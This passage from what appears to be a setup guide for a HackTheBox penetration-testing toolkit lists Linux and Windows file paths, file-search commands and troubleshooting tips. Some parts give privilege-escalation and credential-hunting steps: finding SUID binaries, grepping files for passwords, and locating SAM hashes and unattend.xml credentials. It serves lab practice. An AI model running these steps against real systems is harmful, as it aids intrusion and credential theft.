-rwsr-xr-x  — SUID: runs as file owner, not caller (privesc vector)
drwxrwxrwt  — sticky bit: only owner can delete files inside (like /tmp)
```

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find world-writable directories
find / -writable -type d 2>/dev/null

# Find root-owned writable files
find / -user root -writable 2>/dev/null | grep -v proc
```

### Finding Files on Linux

```bash
# By name
find / -name "filename.txt" 2>/dev/null

# Case-insensitive
find / -iname "filename.txt" 2>/dev/null

# By extension in a specific directory
find /home -name "*.conf" 2>/dev/null

# Modified in the last 10 minutes
find / -mmin -10 -type f 2>/dev/null

# Faster lookup (cached index, may be stale)
locate filename.txt
updatedb    # refresh the index (run as root)

# Find where a command lives
which python3
whereis python
```

> `2>/dev/null` silences "Permission denied" so you only see what you can actually access.

---

## Windows Filesystem Reference

Windows uses drive letters instead of a single root. `C:\` is almost always the system drive.

### Directory Map

| Path | What it's for |
|------|---------------|
| `C:\` | System drive root |
| `C:\Windows\` | The OS — system files, DLLs, drivers |
| `C:\Windows\System32\` | Core executables and libraries (`cmd.exe`, `powershell.exe`, etc.) |
| `C:\Windows\SysWOW64\` | 32-bit versions of System32 libs on 64-bit systems |
| `C:\Windows\Temp\` | System temp — world-writable, good for payloads |
| `C:\Program Files\` | Installed 64-bit apps |
| `C:\Program Files (x86)\` | Installed 32-bit apps |
| `C:\Users\` | Home directories for all users |
| `C:\Users\username\Desktop\` | User desktop — flags often land here |
| `C:\Users\username\Documents\` | User documents — worth checking for creds |
| `C:\Users\username\AppData\` | App data (`Local`, `LocalLow`, `Roaming`) — configs, saved sessions, creds |
| `C:\Users\Public\` | Shared between all users, no special permissions |
| `C:\Users\Administrator\` | Admin home — check Desktop for root flag |
| `C:\ProgramData\` | Shared app data, hidden by default — often has config files with creds |

### HTB-Relevant Paths

```
C:\Users\*\Desktop\              — flags, shortcuts, sensitive files
C:\Users\*\AppData\Roaming\      — browser data, saved sessions, app configs
C:\Users\*\AppData\Local\Temp\   — temp files, dropped payloads
C:\Windows\System32\config\      — SAM database (hashes) — locked while running
C:\Windows\Temp\                 — world-writable, good for staging
C:\inetpub\wwwroot\              — IIS web root
C:\xampp\htdocs\                 — XAMPP web root
C:\ProgramData\                  — app configs, unattended install files
C:\unattend.xml                  — sometimes has plaintext creds
C:\Windows\System32\drivers\etc\hosts — Windows hosts file
```

### Finding Files on Windows

```cmd
:: CMD — search from root
dir /s /b C:\filename.txt

:: By extension
dir /s /b C:\*.config

:: Search file contents (like grep)
findstr /s /i "password" C:\*.txt
findstr /s /i "password" C:\*.xml
findstr /s /i "password" C:\*.config
```

```powershell
# PowerShell — more flexible
Get-ChildItem -Path C:\ -Recurse -Filter "filename.txt" -ErrorAction SilentlyContinue

# Search file contents
Select-String -Path "C:\*.txt" -Pattern "password" -Recurse

# Find recently modified files
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-10) }
```

---

## Additional Resources

| Resource | What it's for |
|----------|---------------|
| [HackTheBox](https://www.hackthebox.com/) | Lab platform |
| [GTFOBins](https://gtfobins.github.io/) | Unix binary exploitation |
| [LOLBAS](https://lolbas-project.github.io/) | Windows binary exploitation |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Payload reference |
| [HackTricks](https://book.hacktricks.xyz/) | Pentesting methodology wiki |
| [CyberChef](https://gchq.github.io/CyberChef/) | Data encoding and decoding |
| [RevShells](https://www.revshells.com/) | Reverse shell generator |
| [Parrot OS Docs](https://www.parrotsec.org/docs/) | Official Parrot documentation |

---

## Troubleshooting

### Common Issues

| Problem | Fix |
|---------|-----|
| GUI apps don't display | Run `fix-wsl-gui`, or restart WSL (`wsl --shutdown`) |
| XRDP connection refused | `sudo service xrdp restart`, check port 3390 |
| Package not found | `sudo apt update` then retry |
| pip install fails | Add `--break-system-packages` flag |
| Hashcat no GPU | Use `--force` to run on CPU, or run hashcat natively on Windows |
| VPN doesn't connect | Check `.ovpn` file, try `sudo openvpn --config file.ovpn` directly |
| No tun0 interface | VPN isn't connected, or needs restart |
| Tool crashes in WSL | Check if it needs systemd — some services require it |
| DNS not resolving | Check `/etc/resolv.conf`, add `nameserver 8.8.8.8` |

### Getting Help

```bash
# Built-in help — always try this first
tool --help
tool -h
man tool

# In-toolkit cheat sheets
cheat <toolname>
```
